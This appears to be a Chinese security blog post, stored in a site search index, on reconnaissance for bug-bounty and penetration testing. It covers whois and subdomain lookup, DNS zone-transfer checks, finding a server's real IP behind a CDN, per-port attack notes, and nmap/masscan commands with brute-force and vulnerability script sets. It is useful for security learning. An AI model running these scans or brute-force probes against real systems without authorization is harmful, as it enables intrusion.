<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>信息搜集</title>
    <url>/2020/10/13/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<p>SRC资产信息收集聚合网站：<a href="http://lovebear.top/info/" target="_blank" rel="noopener">http://lovebear.top/info/</a></p>
<a id="more"></a>

<h2 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h2><h3 id="Whois-查询"><a href="#Whois-查询" class="headerlink" title="Whois 查询"></a>Whois 查询</h3><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">站长之家Whois查询</a>  <a href="http://whois.aizhan.com/" target="_blank" rel="noopener">爱站</a>  <a href="https://site.ip138.com/" target="_blank" rel="noopener">ip138</a>  <a href="https://www.whois.net/" target="_blank" rel="noopener">Whois Lookup</a>  <a href="https://lookup.icann.org/" target="_blank" rel="noopener">ICANN Lookup</a>  <a href="https://whois.cloud.tencent.com/domain?domain=" target="_blank" rel="noopener">腾讯云</a>  <a href="http://nicolasbouliane.com/utils/whois/?url=http://baidu.com" target="_blank" rel="noopener">nicolasbouliane</a>  <a href="http://whois.xinnet.com/" target="_blank" rel="noopener">新网 whois查询</a>  <a href="http://tool.chinaz.com/ipwhois/" target="_blank" rel="noopener">站长工具</a></p>
<h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><p><a href="http://www.beianbeian.com/" target="_blank" rel="noopener">ICP备案查询网</a>  <a href="http://icp.chinaz.com/" target="_blank" rel="noopener">ICP备案查询-站长工具</a>  <a href="https://www.aizhan.com/seo/" target="_blank" rel="noopener">SEO综合查询-爱站</a>  <a href="http://icp.chinaz.com/searchs" target="_blank" rel="noopener">批量查询-站长工具</a>  <a href="http://www.beian.miit.gov.cn/publish/query/indexFirst.action" target="_blank" rel="noopener">工业和信息化部ICP/IP/域名信息备案管理</a>  <a href="https://www.sec.gov/edgar/searchedgar/companysearch.html" target="_blank" rel="noopener">美国企业备案查询</a></p>
<h3 id="信用信息查询"><a href="#信用信息查询" class="headerlink" title="信用信息查询"></a>信用信息查询</h3><p><a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">国家企业信用信息公示系统</a>  <a href="http://company.xizhi.com/" target="_blank" rel="noopener">悉知-全国企业信息查询</a>  <a href="https://www.creditchina.gov.cn/" target="_blank" rel="noopener">信用中国-个人信用查询搜索-企业信息查询搜索-统一社会信用代码查询</a></p>
<h3 id="IP反查站点的站"><a href="#IP反查站点的站" class="headerlink" title="IP反查站点的站"></a>IP反查站点的站</h3><p><a href="https://dnslytics.com/" target="_blank" rel="noopener">Dnslytics</a></p>
<p>利用Dnslytics反查IP可以得到如下信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IP information</span><br><span class="line">Network information</span><br><span class="line">Hosting information</span><br><span class="line">SPAM database lookup</span><br><span class="line">Open TCP&#x2F;UDP ports</span><br><span class="line">Blocklist lookup</span><br><span class="line">Whois information</span><br><span class="line">Geo information</span><br><span class="line">Country information</span><br><span class="line">Update information</span><br></pre></td></tr></table></figure>

<p>利用Dnslytics反查域名可以得到如下信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Domain and Ranking Information</span><br><span class="line">Hosting Information&#123;</span><br><span class="line">    A &#x2F; AAAA Record</span><br><span class="line">    NS Record</span><br><span class="line">    MX Record</span><br><span class="line">    SPF Record</span><br><span class="line">&#125;</span><br><span class="line">Web Information</span><br><span class="line">Whois Information</span><br></pre></td></tr></table></figure>
<h3 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>通过Google、FireFox等插件的使用，收集域名信息</p>
<p>myip.ms   TCPIPUTILS   DNSlytics</p>
<h2 id="相关应用信息"><a href="#相关应用信息" class="headerlink" title="相关应用信息"></a>相关应用信息</h2><p><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">天眼查</a>  <a href="https://www.qichacha.com/" target="_blank" rel="noopener">企查查</a>  <a href="https://www.qimai.cn/" target="_blank" rel="noopener">七麦数据</a>  <a href="https://apps.apple.com/" target="_blank" rel="noopener">AppStore</a></p>
<h2 id="子域名信息"><a href="#子域名信息" class="headerlink" title="子域名信息"></a>子域名信息</h2><h3 id="在线平台"><a href="#在线平台" class="headerlink" title="在线平台"></a>在线平台</h3><h4 id="第三方平台查询"><a href="#第三方平台查询" class="headerlink" title="第三方平台查询"></a>第三方平台查询</h4><p>主要是一些第三方网站和一些博主提供的服务</p>
<p><a href="https://site.ip138.com/" target="_blank" rel="noopener">ip138</a>  <a href="http://tool.chinaz.com/subdomain/?domain=" target="_blank" rel="noopener">站长工具</a>  <a href="https://hackertarget.com/find-dns-host-records/" target="_blank" rel="noopener">hackertarget</a>  <a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">phpinfo</a>  <a href="https://www.t1h2ua.cn/tools/" target="_blank" rel="noopener">t1h2ua</a>  <a href="https://dnsdumpster.com/" target="_blank" rel="noopener">dnsdumpster</a>  <a href="https://d.chinacycc.com/" target="_blank" rel="noopener">chinacycc</a>  <a href="http://z.zcjun.com/" target="_blank" rel="noopener">zcjun</a></p>
<h4 id="权重综合查询"><a href="#权重综合查询" class="headerlink" title="权重综合查询"></a>权重综合查询</h4><p><a href="https://www.aizhan.com/seo/" target="_blank" rel="noopener">爱站</a>  <a href="http://rank.chinaz.com/all/" target="_blank" rel="noopener">站长工具</a></p>
<h4 id="全国政府网站基本数据库"><a href="#全国政府网站基本数据库" class="headerlink" title="全国政府网站基本数据库"></a>全国政府网站基本数据库</h4><p><a href="http://114.55.181.28/databaseInfo/index" target="_blank" rel="noopener">Address Link</a></p>
<h4 id="IP反查绑定域名网站"><a href="#IP反查绑定域名网站" class="headerlink" title="IP反查绑定域名网站"></a>IP反查绑定域名网站</h4><p>IP关联域名，大部分网站一个IP多个域名</p>
<p><a href="http://s.tool.chinaz.com/same?s" target="_blank" rel="noopener">chinaz</a>  <a href="http://dns.aizhan.com/" target="_blank" rel="noopener">aizhan</a>  <a href="https://webscan.cc/" target="_blank" rel="noopener">webscan.cc</a></p>
<h3 id="资产搜索引擎"><a href="#资产搜索引擎" class="headerlink" title="资产搜索引擎"></a>资产搜索引擎</h3><p>资产搜索引擎: google、shodan、FOFA、zoomeye</p>
<p>Google语法查询:  <code>搜索子域名 &quot;site:xxxxx&quot;</code>  <code>site:baidu.com</code></p>
<p>FOFA语法查询: <a href="https://fofa.so/" target="_blank" rel="noopener">fofa.so</a></p>
<p>搜索子域名 <code>&quot;domain:xxxxx&quot;</code>  <code>domain=&quot;baidu.com&quot;</code></p>
<h3 id="工具枚举"><a href="#工具枚举" class="headerlink" title="工具枚举"></a>工具枚举</h3><p>常用子域名工具:</p>
<p> <code>OneForAll</code>  <code>Layer</code>  <code>Sublist3r</code>  <code>subDomainsBrute</code>  <code>K8</code>  <code>wydomain</code>  <code>dnsmaper</code>  <code>dnsbrute</code>  <code>Findomain</code>  <code>fierce等</code></p>
<h3 id="证书透明度公开日志枚举"><a href="#证书透明度公开日志枚举" class="headerlink" title="证书透明度公开日志枚举"></a>证书透明度公开日志枚举</h3><p>  证书透明度(Certificate Transparency, CT)是证书授权机构(CA) 的一个项目，证书授权机构会将每个SSL/TLS证书发布到公共日志中。一个SSL/TLS证书通常包含域名、子域名和邮件地址。用搜索引|擎搜索一些公开的CT日志可以查找某个域名所属证书</p>
<h4 id="在线第三方平台查询"><a href="#在线第三方平台查询" class="headerlink" title="在线第三方平台查询"></a>在线第三方平台查询</h4><p><a href="https://crt.sh/" target="_blank" rel="noopener">crt.sh</a>  <a href="https://censys.io/" target="_blank" rel="noopener">censys</a>  <a href="https://myssl.com/" target="_blank" rel="noopener">myssl</a></p>
<h4 id="工具枚举查询"><a href="#工具枚举查询" class="headerlink" title="工具枚举查询"></a>工具枚举查询</h4><p>通过工具可以调用各个证书接口进行域名查询<br>常用工具：<code>Findomain</code>  <code>Sublist3r（SSL Certificates）</code>等</p>
<p>Findomain不使用子域名寻找的常规方法，而是使用证书透明度日志来查找子域，并且该方法使其工具更加快速和可靠。该工具使用多个公共API来执行搜索：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Certspotter</span><br><span class="line">Crt.sh</span><br><span class="line">Virustotal</span><br><span class="line">Sublist3r</span><br><span class="line">Facebook </span><br><span class="line">Spyse (CertDB)</span><br><span class="line">Bufferover</span><br><span class="line">Threadcrow</span><br><span class="line">Virustotal with apikey</span><br></pre></td></tr></table></figure>
<p>项目地址：<code>https://github.com/Edu4rdSHL/findomain</code><br>子域名收集：<code>findomain -t target.com</code><br>使用所有API搜索子域并将数据导出到CSV文件：<code>findomain -t target.com -a -o csv</code></p>
<h3 id="DNS历史解析"><a href="#DNS历史解析" class="headerlink" title="DNS历史解析"></a>DNS历史解析</h3><p><a href="https://www.dnsdb.io/" target="_blank" rel="noopener">dnsdb</a>  <a href="https://viewdns.info/" target="_blank" rel="noopener">viewdns</a></p>
<h3 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h3><p>####DNS域传送漏洞原理<br>DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。</p>
<p>若DNS服务器配置不当，可能导致攻击者获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。同时，黑客可以快速的判定出某个特定zone的所有主机，收集域信息，选择攻击目标，找出未使用的IP地址，绕过基于网络的访问控制。</p>
<h4 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h4><p>Whois查询</p>
<h4 id="DNS域传送漏洞检测"><a href="#DNS域传送漏洞检测" class="headerlink" title="DNS域传送漏洞检测"></a>DNS域传送漏洞检测</h4><h5 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h5><p>基本过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1) nslookup             #进入交互式shell</span><br><span class="line">2) server dns.xx.yy.zz  #设定查询将要使用的DNS服务器</span><br><span class="line">3) ls xx.yy.zz          #列出某个域中的所有域名</span><br><span class="line">4) exit                 #退出</span><br></pre></td></tr></table></figure>
<p>漏洞检验-不存在漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; nslookup</span><br><span class="line">Server:  lkwifi.cn</span><br><span class="line">Address:  192.168.68.1</span><br><span class="line"></span><br><span class="line">*** lkwifi.cn can&#39;t find nslookup: Non-existent domain</span><br><span class="line">&gt; server ss2.bjfu.edu.cn</span><br><span class="line">Default Server:  ss2.bjfu.edu.cn</span><br><span class="line">Address:  202.204.112.67</span><br><span class="line"></span><br><span class="line">&gt; ls bjfu.edu.cn</span><br><span class="line">[ss2.bjfu.edu.cn]</span><br><span class="line">*** Can&#39;t list domain bjfu.edu.cn: Query refused</span><br><span class="line">The DNS server refused to transfer the zone bjfu.edu.cn to your computer. If this</span><br><span class="line">is incorrect, check the zone transfer security settings for bjfu.edu.cn on the DNS</span><br><span class="line">server at IP address 202.204.112.67.</span><br><span class="line"></span><br><span class="line">&gt; exit</span><br></pre></td></tr></table></figure>
<p>漏洞检验-存在漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; nslookup</span><br><span class="line">&gt; server dns1.xxx.edu.cn</span><br><span class="line">&gt; ls xxx.edu.cn</span><br></pre></td></tr></table></figure>
<h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h5><p>利用nmap漏洞检测脚本”dns-zone-transfer”进行检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain&#x3D;xxx.edu.cn -p 53 -Pn dns.xxx.edu.cn</span><br><span class="line">--script dns-zone-transfer 表示加载nmap漏洞检测脚本dns-zone-transfer.nse，扩展名.nse可省略</span><br><span class="line"></span><br><span class="line">--script-args dns-zone-transfer.domain&#x3D;xxx.edu.cn 向脚本传递参数，设置列出某个域中的所有域名</span><br><span class="line"></span><br><span class="line">-p 53 设置扫描53端口</span><br><span class="line"></span><br><span class="line">-Pn 设置通过Ping发现主机是否存活</span><br></pre></td></tr></table></figure>
<h5 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h5><p>使用说明 <code>dig -h</code><br>漏洞测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @dns.xxx.edu.cn axfr xxx.edu.cn</span><br></pre></td></tr></table></figure>
<p><code>axfr</code> 是q-type类型的一种: axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录。</p>
<h2 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h2><h3 id="CDN简介"><a href="#CDN简介" class="headerlink" title="CDN简介"></a>CDN简介</h3><p>CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。</p>
<h3 id="国内外CND"><a href="#国内外CND" class="headerlink" title="国内外CND"></a>国内外CND</h3><p>国内:<br>  <code>阿里云</code>  <code>腾讯云</code>  <code>百度云</code> <code>网宿科技(ChinanNet Center)</code>  <code>蓝汛</code>  <code>金山云</code>  <code>UCloud</code>  <code>网易云</code>  <code>世纪互联</code>  <code>七牛云</code>  <code>京东云</code>等<br>国外:<br>  <code>Akamai(阿卡迈)</code>  <code>Limelight Networks(简称LLNW)</code>  <code>AWS Cloud(亚马逊)</code>  <code>Google(谷歌)</code>  <code>Comcast(康卡斯特)</code></p>
<h3 id="判断目标是否存在CDN"><a href="#判断目标是否存在CDN" class="headerlink" title="判断目标是否存在CDN"></a>判断目标是否存在CDN</h3><h4 id="Ping目标主域"><a href="#Ping目标主域" class="headerlink" title="Ping目标主域"></a>Ping目标主域</h4><p>通常通过ping目标主域，观察域名的解析情况，以此来判断其是否使用了CDN</p>
<h4 id="Nslookup"><a href="#Nslookup" class="headerlink" title="Nslookup"></a>Nslookup</h4><p>不同DNS域名解析情况对比，判断其是否使用了CDN<br>不同DNS解析结果若不一样，很有可能存在CDN服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup www.baidu.com 8.8.8.8</span><br><span class="line"></span><br><span class="line">nslookup www.baidu.com 114.114.114.114</span><br></pre></td></tr></table></figure>
<h4 id="nslookup默认解析"><a href="#nslookup默认解析" class="headerlink" title="nslookup默认解析"></a>nslookup默认解析</h4><p>若解析结果有多个，很有可能存在CDN，相反，若解析结果有一个，可能不存在CDN(不能肯定)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ns lookup www.baidu.com</span><br></pre></td></tr></table></figure>

<h4 id="全国Ping"><a href="#全国Ping" class="headerlink" title="全国Ping"></a>全国Ping</h4><p>利用全国多地区的ping服务器操作，然后对比每个地区ping出的IP结果，查看这些IP是否一致， 如果都是一样的，极有可能不存在CDN。如果IP大多不太一样或者规律性很强，可以尝试查询这些IP的归属地，判断是否存在CDN。在线网址:  <a href="http://ping.chinaz.com/" target="_blank" rel="noopener">Ping检测-站长工具</a>  <a href="https://www.17ce.com/" target="_blank" rel="noopener">17CE</a>   <a href="https://tools.ipip.net/newping.php" target="_blank" rel="noopener">ipip (支持国内、国外)</a></p>
<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p><a href="https://www.cdnplanet.com/tools/cdnfinder/" target="_blank" rel="noopener">cdnplanet</a></p>
<h3 id="绕过CDN"><a href="#绕过CDN" class="headerlink" title="绕过CDN"></a>绕过CDN</h3><p>####内部邮箱源<br>一般的邮件系统都在内部，没有经过CDN的解析，通过利用目标网站的邮箱注册、找回密码或者RSS订阅等功能，查看邮件、寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名,就可以获得目标的真实IP。<em>必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的。</em></p>
<h4 id="国外请求"><a href="#国外请求" class="headerlink" title="国外请求"></a>国外请求</h4><p>很多时候国内的CDN对国外得覆盖面并不是很广，故此可以利用此特点进行探测。通过国外代理访问就能查看真实IP了，或者通过国外的DNS解析，可能就能得到真实的IP。</p>
<h4 id="国际Ping"><a href="#国际Ping" class="headerlink" title="国际Ping"></a>国际Ping</h4><p>国际ping测试站点<br><a href="https://tools.ipip.net/newping.php" target="_blank" rel="noopener">ipip</a><br><a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">ASM</a></p>
<h4 id="国外DNS解析"><a href="#国外DNS解析" class="headerlink" title="国外DNS解析"></a>国外DNS解析</h4><p><a href="http://www.ab173.com/dns/dns_world.php" target="_blank" rel="noopener">世界各地DNS服务器地址大全</a></p>
<h4 id="分站域名-amp-C段查询"><a href="#分站域名-amp-C段查询" class="headerlink" title="分站域名&amp;C段查询"></a>分站域名&amp;C段查询</h4><p>很多网站主站的访问量会比较大，所以主站都是挂CDN的，但是分站可能没有挂CDN,可以通过ping二级域名获取分站IP， 可能会出现分站和主站不是同一个IP但在同一个C段下面的情况，从而能判断出目标的真实IP段。</p>
<h4 id="分站域名"><a href="#分站域名" class="headerlink" title="分站域名"></a>分站域名</h4><p>上 &lt;子域名信息-在线平台-ip反查&gt; </p>
<h4 id="C段查询"><a href="#C段查询" class="headerlink" title="C段查询"></a>C段查询</h4><ul>
<li>工具</li>
</ul>
<p><code>K8_C段旁注工具6.0</code>、<code>nmap</code>、<code>IISPutScanner</code>、<code>小米范WEB查找器</code> 等</p>
<ul>
<li>网络资产搜索引擎<br>Fofa、Shodan、ZoomEye</li>
</ul>
<p>利用这些网络空间资产搜索引擎来搜索暴露在外的端口信息<br>利用语法搜索C段信息</p>
<h4 id="网站漏洞"><a href="#网站漏洞" class="headerlink" title="网站漏洞"></a>网站漏洞</h4><p>通过网站的信息泄露如phpinfo泄露，github信息泄露，命令执行等漏洞获取真实ip。</p>
<ul>
<li><p>一些测试文件<br>phpinfo、test等</p>
</li>
<li><p>SSRF漏洞<br>服务器主动向外发起连接，找到真实IP地址</p>
</li>
</ul>
<h4 id="查询域名解析记录"><a href="#查询域名解析记录" class="headerlink" title="查询域名解析记录"></a>查询域名解析记录</h4><p>一般网站从部署开始到使用cdn都有一个过程，周期如果较长的话则可以通过这类历史解析记录查询等方式获取源站ip，查看IP与域名绑定的历史记录，可能会存在使用CDN前的记录。<br>在线查询<br><a href="https://www.dnsdb.io/" target="_blank" rel="noopener">dnsdb</a><br><a href="https://sitereport.netcraft.com/?url=" target="_blank" rel="noopener">NETCRAFT</a><br><a href="https://viewdns.info/" target="_blank" rel="noopener">viewdns</a><br><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">threatbook</a><br><a href="https://securitytrails.com/" target="_blank" rel="noopener">securitytrails</a></p>
<h4 id="目标网站APP应用"><a href="#目标网站APP应用" class="headerlink" title="目标网站APP应用"></a>目标网站APP应用</h4><p>如果目标网站有自己的App，可以尝试利用Fiddler或Burp Suite抓取App的请求，从里面找到目标的真实IP。</p>
<h4 id="网络空间引擎搜索"><a href="#网络空间引擎搜索" class="headerlink" title="网络空间引擎搜索"></a>网络空间引擎搜索</h4><p>shodan、FOFA、zoomeye</p>
<h2 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h2><p>端口一般是指TCP/IP协议中的端口，端口号的范围是从0-65535。</p>
<h3 id="常见端口-amp-解析-amp-总结"><a href="#常见端口-amp-解析-amp-总结" class="headerlink" title="常见端口&amp;解析&amp;总结"></a>常见端口&amp;解析&amp;总结</h3><p>常用的端口利用及解析</p>
<pre><code>21：FTP/TFTP/VSFTPD 总结：爆破/嗅探/溢出/后门
22：ssh远程连接      总结：爆破/openssh漏洞
23：Telnet远程连接   总结：爆破/嗅探/弱口令
25：SMTP邮件服务     总结：邮件伪造
53：DNS域名解析系统   总结：域传送/劫持/缓存投毒/欺骗
67/68：dhcp服务      总结：劫持/欺骗
110：pop3              总结：爆破/嗅探
139：Samba服务         总结：爆破/未授权访问/远程命令执行
143：Imap协议         总结：爆破161SNMP协议爆破/搜集目标内网信息
389：Ldap目录访问协议 总结：注入/未授权访问/弱口令
445：smb              总结：ms17-010/端口溢出
512/513/514：Linux Rexec服务 总结：爆破/Rlogin登陆
873：Rsync服务                 总结：文件上传/未授权访问
1080：socket                  总结：爆破
1352：Lotus domino邮件服务   总结：爆破/信息泄漏
1433：mssql                  总结：爆破/注入/SA弱口令
1521：oracle       总结：爆破/注入/TNS爆破/反弹shell2049Nfs服务配置不当
2181：zookeeper服务            总结：未授权访问
2375：docker remote api    总结：未授权访问
3306：mysql                 总结：爆破/注入
3389：Rdp远程桌面链接        总结：爆破/shift后门
4848：GlassFish控制台       总结：爆破/认证绕过
5000：sybase/DB2数据库      总结：爆破/注入/提权
5432：postgresql             总结：爆破/注入/缓冲区溢出
5632：pcanywhere服务        总结：抓密码/代码执行
5900：vnc                     总结：爆破/认证绕过
6379：Redis数据库           总结：未授权访问/爆破
7001/7002：weblogic         总结：java反序列化/控制台弱口令
80/443：http/https         总结：web应用漏洞/心脏滴血
8069：zabbix服务            总结：远程命令执行/注入
8161：activemq             总结：弱口令/写文件
8080/8089：Jboss/Tomcat/Resin 总结：爆破/PUT文件上传/反序列化
8083/8086：influxDB         总结：未授权访问
9000：fastcgi                 总结：远程命令执行
9090：Websphere             总结：控制台爆破/java反序列化/弱口令
9200/9300：elasticsearch   总结：远程代码执行
11211：memcached             总结：未授权访问
27017/27018：mongodb         总结：未授权访问/爆破</code></pre><h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><ul>
<li>扫描多个IP</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">扫描整个子网 nmap 192.168.6.1&#x2F;24</span><br><span class="line">           nmap 192.168.1.1&#x2F;16</span><br><span class="line">           nmap 192.168.1-30.1-254</span><br><span class="line">           nmap 192.168.1-254.6</span><br><span class="line">扫描多个主机 namp 192.168.6.2 192.168.6.6</span><br><span class="line">扫描一个小范围 nmap 192.168.6.2-10</span><br><span class="line">扫描txt内的ip列表  nmap -iL text.txt</span><br><span class="line">扫描除某个目标外   nmap 192.168.6.1&#x2F;24 -exclude 192.168.6.25</span><br></pre></td></tr></table></figure>

<ul>
<li>绕过Firewalld扫描主机端口</li>
</ul>
<p>通过不同的协议(TCP半连接、TCP全连接、ICMP、UDP等)的扫描绕过Firewalld的限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.33.6.128</span><br><span class="line">nmap -sT 192.33.6.128</span><br><span class="line">nmap -sS 192.33.6.128</span><br><span class="line">nmap -sU 192.33.6.128</span><br><span class="line">nmap -sF 192.33.6.128</span><br><span class="line">nmap -sX 192.33.6.128</span><br><span class="line">nmap -sN 192.33.6.128</span><br></pre></td></tr></table></figure>
<ul>
<li>初步扫描端口信息<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -T4 -A -v -Pn 192.168.1.1&#x2F;24 -p 21,22,23,25,80,81,82,83,88,110,143,443,445,512,513,514,1433,1521,2082,2083,2181,2601,2604,3128,3306,3389,3690,4848,5432,5900,5984,6379,7001,7002,8069,8080,8081,8086,8088,9200,9300,11211,10000,27017,27018,50000,50030,50070 -oN nmap_result.txt</span><br></pre></td></tr></table></figure></li>
<li>扫描端口并且标记可以爆破的服务<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 127.0.0.1 --script&#x3D;ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute</span><br></pre></td></tr></table></figure></li>
<li>判断常见的漏洞并扫描端口<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 127.0.0.1 --script&#x3D;auth,vuln</span><br></pre></td></tr></table></figure></li>
<li>精确判断漏洞并扫描端口<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 127.0.0.1 --script&#x3D;dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h4><ul>
<li><p>Masscan主要是真对全网进行端口扫描<br><a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener">https://github.com/robertdavidgraham/masscan</a></p>
</li>
<li><p>Masscan+Nmap<br>有些时候网站的入口点属于非常规端口，因此是必须要做全端口扫描，做全端口扫描的时候由于<strong>namp</strong>发包量大经常出现各种问题，如端口扫描不全、获得信息不准等等，为了解决上述问题，这里提供一个<strong>masscan+nmap</strong>结合的方式进行快速扫描。<br>原理：使用masscan做全端口开放检测，检测出来端口信息后，用nmap进行服务信息识别。<br>使用：终端输入以下命令执行即可</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># masscan 192.33.6.145 -p1-65535  --rate 1000 -oL ports</span><br><span class="line"></span><br><span class="line"># ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $3&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39;  | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39; | sed &#39;s&#x2F;^,,&#x2F;&#x2F;&#39;)</span><br><span class="line"></span><br><span class="line"># nmap -sV -p $ports 192.33.6.145</span><br></pre></td></tr></table></figure>

<h4 id="masnmapscan"><a href="#masnmapscan" class="headerlink" title="masnmapscan"></a>masnmapscan</h4><p>masnmapscan整合了masscan和nmap两款扫描器，masscan扫描端口，nmap扫描端口对应服务，二者结合起来实现了又快又好地扫描。并且加入了针对目标资产有防火墙的应对措施。<a href="https://github.com/hellogoldsnakeman/masnmapscan-V1.0" target="_blank" rel="noopener">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</a></p>
<h4 id="ZMap"><a href="#ZMap" class="headerlink" title="ZMap"></a>ZMap</h4><p>Zmap主要是真对全网进行端口扫描 <a href="https://github.com/zmap/zmap" target="_blank" rel="noopener">https://github.com/zmap/zmap</a></p>
<h4 id="御剑高速TCP端口扫描工具"><a href="#御剑高速TCP端口扫描工具" class="headerlink" title="御剑高速TCP端口扫描工具"></a>御剑高速TCP端口扫描工具</h4><h4 id="御剑高速端口扫描工具"><a href="#御剑高速端口扫描工具" class="headerlink" title="御剑高速端口扫描工具"></a>御剑高速端口扫描工具</h4><h4 id="IISPutScanner"><a href="#IISPutScanner" class="headerlink" title="IISPutScanner"></a>IISPutScanner</h4><h4 id="IISPutScanner增强版"><a href="#IISPutScanner增强版" class="headerlink" title="IISPutScanner增强版"></a>IISPutScanner增强版</h4><h3 id="网络空间引擎搜索-1"><a href="#网络空间引擎搜索-1" class="headerlink" title="网络空间引擎搜索"></a>网络空间引擎搜索</h3><p>shodan、FOFA、zoomeye</p>
<h3 id="浏览器插件-1"><a href="#浏览器插件-1" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>Shodan<br>TCPIPUTILS<br>DNSlytics<br>fofa-view</p>
<h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><h3 id="第三方平台"><a href="#第三方平台" class="headerlink" title="第三方平台"></a>第三方平台</h3><ul>
<li><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">云悉</a></li>
<li><a href="http://finger.tidesec.net/" target="_blank" rel="noopener">TideFinger</a></li>
<li><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">BugScaner</a></li>
<li><a href="https://fp.shuziguanxing.com/#/" target="_blank" rel="noopener">数字观星</a></li>
</ul>
<h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3><p><code>御剑Web指纹识别</code>、<code>WhatWeb</code>、<code>Test404轻量CMS指纹识别+v2.1</code>、<code>椰树</code>等，可以快速识别一些主流CMS<br>Github项目: </p>
<ul>
<li><a href="https://github.com/Tuhinshubhra/CMSeeK" target="_blank" rel="noopener">CMSeeK</a></li>
<li><a href="https://github.com/Dionach/CMSmap" target="_blank" rel="noopener">CMSmap</a></li>
<li><a href="https://github.com/aedoo/ACMSDiscovery" target="_blank" rel="noopener">ACMSDiscovery</a></li>
<li><a href="https://github.com/TideSec/TideFinger" target="_blank" rel="noopener">TideFinger</a></li>
<li><a href="https://github.com/Lucifer1993/AngelSword" target="_blank" rel="noopener">AngelSword</a></li>
</ul>
<h3 id="浏览器插件-2"><a href="#浏览器插件-2" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>Wappalyzer</p>
